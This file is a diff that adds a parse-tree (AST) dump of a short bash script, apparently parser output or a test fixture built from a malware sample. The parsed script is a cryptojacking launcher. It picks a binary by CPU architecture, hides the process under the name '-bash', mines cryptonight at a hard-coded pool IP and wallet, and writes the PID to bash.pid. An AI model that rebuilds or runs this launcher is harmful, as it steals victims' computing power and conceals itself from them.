@@ -1,0 +1,125 @@
+CommandNode(lineno=3, pos=(13, 25), parts=[
+  AssignmentNode(lineno=3, pos=(13, 25), word='proc=`nproc`', parts=[
+    CommandsubstitutionNode(command=
+      CommandNode(lineno=3, pos=(19, 24), parts=[
+        WordNode(lineno=3, pos=(19, 24), word='nproc'),
+      ]), lineno=3, pos=(18, 25)),
+  ]),
+])
+CommandNode(lineno=4, pos=(26, 41), parts=[
+  AssignmentNode(lineno=4, pos=(26, 41), word='ARCH=`uname -m`', parts=[
+    CommandsubstitutionNode(command=
+      CommandNode(lineno=4, pos=(32, 40), parts=[
+        WordNode(lineno=4, pos=(32, 37), word='uname'),
+        WordNode(lineno=4, pos=(38, 40), word='-m'),
+      ]), lineno=4, pos=(31, 41)),
+  ]),
+])
+CommandNode(lineno=5, pos=(42, 54), parts=[
+  AssignmentNode(lineno=5, pos=(42, 54), word='HIDE=-bash'),
+])
+CompoundNode(lineno=13, list=[
+  IfNode(lineno=13, pos=(56, 799), parts=[
+    ReservedwordNode(lineno=7, pos=(56, 58), word='if'),
+    ListNode(lineno=7, pos=(59, 81), parts=[
+        CommandNode(lineno=7, pos=(59, 80), parts=[
+          WordNode(lineno=7, pos=(59, 60), word='['),
+          WordNode(lineno=7, pos=(61, 68), word='$ARCH', parts=[
+            ParameterNode(lineno=7, pos=(62, 67), value='ARCH'),
+          ]),
+          WordNode(lineno=7, pos=(69, 71), word='=='),
+          WordNode(lineno=7, pos=(72, 78), word='i686'),
+          WordNode(lineno=7, pos=(79, 80), word=']'),
+        ]),
+        OperatorNode(lineno=7, op=';', pos=(80, 81)),
+      ]),
+    ReservedwordNode(lineno=7, pos=(88, 92), word='then'),
+    ListNode(lineno=8, pos=(101, 303), parts=[
+        CommandNode(lineno=8, pos=(101, 301), parts=[
+          WordNode(lineno=8, pos=(101, 106), word='./h32'),
+          WordNode(lineno=8, pos=(107, 109), word='-s'),
+          WordNode(lineno=8, pos=(110, 115), word='$HIDE', parts=[
+            ParameterNode(lineno=8, pos=(110, 115), value='HIDE'),
+          ]),
+          WordNode(lineno=8, pos=(116, 122), word='./md32'),
+          WordNode(lineno=8, pos=(123, 125), word='-a'),
+          WordNode(lineno=8, pos=(126, 137), word='cryptonight'),
+          WordNode(lineno=8, pos=(138, 140), word='-o'),
+          WordNode(lineno=8, pos=(141, 174), word='stratum+tcp://107.191.99.227:3333'),
+          WordNode(lineno=8, pos=(175, 177), word='-u'),
+          WordNode(lineno=8, pos=(178, 284), word='4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRybb3kLz45H8EgLWZU'),
+          WordNode(lineno=8, pos=(285, 287), word='-p'),
+          WordNode(lineno=8, pos=(288, 289), word='x'),
+          RedirectNode(lineno=8, output=
+            WordNode(lineno=8, pos=(292, 301), word='/dev/null'), pos=(290, 301), type='>>'),
+        ]),
+        OperatorNode(lineno=8, op='&', pos=(302, 303)),
+      ]),
+    ReservedwordNode(lineno=9, pos=(304, 308), word='elif'),
+    ListNode(lineno=9, pos=(309, 333), parts=[
+        CommandNode(lineno=9, pos=(309, 332), parts=[
+          WordNode(lineno=9, pos=(309, 310), word='['),
+          WordNode(lineno=9, pos=(311, 318), word='$ARCH', parts=[
+            ParameterNode(lineno=9, pos=(312, 317), value='ARCH'),
+          ]),
+          WordNode(lineno=9, pos=(319, 321), word='=='),
+          WordNode(lineno=9, pos=(322, 330), word='x86_64'),
+          WordNode(lineno=9, pos=(331, 332), word=']'),
+        ]),
+        OperatorNode(lineno=9, op=';', pos=(332, 333)),
+      ]),
+    ReservedwordNode(lineno=9, pos=(336, 340), word='then'),
+    ListNode(lineno=10, pos=(349, 549), parts=[
+        CommandNode(lineno=10, pos=(349, 547), parts=[
+          WordNode(lineno=10, pos=(349, 354), word='./h64'),
+          WordNode(lineno=10, pos=(355, 357), word='-s'),
+          WordNode(lineno=10, pos=(358, 363), word='$HIDE', parts=[
+            ParameterNode(lineno=10, pos=(358, 363), value='HIDE'),
+          ]),
+          WordNode(lineno=10, pos=(364, 368), word='./md'),
+          WordNode(lineno=10, pos=(369, 371), word='-a'),
+          WordNode(lineno=10, pos=(372, 383), word='cryptonight'),
+          WordNode(lineno=10, pos=(384, 386), word='-o'),
+          WordNode(lineno=10, pos=(387, 420), word='stratum+tcp://107.191.99.227:3333'),
+          WordNode(lineno=10, pos=(421, 423), word='-u'),
+          WordNode(lineno=10, pos=(424, 530), word='4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRybb3kLz45H8EgLWZU'),
+          WordNode(lineno=10, pos=(531, 533), word='-p'),
+          WordNode(lineno=10, pos=(534, 535), word='x'),
+          RedirectNode(lineno=10, output=
+            WordNode(lineno=10, pos=(538, 547), word='/dev/null'), pos=(536, 547), type='>>'),
+        ]),
+        OperatorNode(lineno=10, op='&', pos=(548, 549)),
+      ]),
+    ReservedwordNode(lineno=11, pos=(582, 586), word='else'),
+    ListNode(lineno=12, pos=(595, 796), parts=[
+        CommandNode(lineno=12, pos=(595, 794), parts=[
+          WordNode(lineno=12, pos=(595, 600), word='./h64'),
+          WordNode(lineno=12, pos=(601, 603), word='-s'),
+          WordNode(lineno=12, pos=(604, 609), word='$HIDE', parts=[
+            ParameterNode(lineno=12, pos=(604, 609), value='HIDE'),
+          ]),
+          WordNode(lineno=12, pos=(610, 615), word='./mdx'),
+          WordNode(lineno=12, pos=(616, 618), word='-a'),
+          WordNode(lineno=12, pos=(619, 630), word='cryptonight'),
+          WordNode(lineno=12, pos=(631, 633), word='-o'),
+          WordNode(lineno=12, pos=(634, 667), word='stratum+tcp://107.191.99.227:3333'),
+          WordNode(lineno=12, pos=(668, 670), word='-u'),
+          WordNode(lineno=12, pos=(671, 777), word='4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRybb3kLz45H8EgLWZU'),
+          WordNode(lineno=12, pos=(778, 780), word='-p'),
+          WordNode(lineno=12, pos=(781, 782), word='x'),
+          RedirectNode(lineno=12, output=
+            WordNode(lineno=12, pos=(785, 794), word='/dev/null'), pos=(783, 794), type='>>'),
+        ]),
+        OperatorNode(lineno=12, op='&', pos=(795, 796)),
+      ]),
+    ReservedwordNode(lineno=13, pos=(797, 799), word='fi'),
+  ]),
+], pos=(56, 799))
+CommandNode(lineno=14, pos=(800, 818), parts=[
+  WordNode(lineno=14, pos=(800, 804), word='echo'),
+  WordNode(lineno=14, pos=(805, 807), word='$!', parts=[
+    ParameterNode(lineno=14, pos=(805, 807), value='!'),
+  ]),
+  RedirectNode(lineno=14, output=
+    WordNode(lineno=14, pos=(810, 818), word='bash.pid'), pos=(808, 818), type='>'),
+])
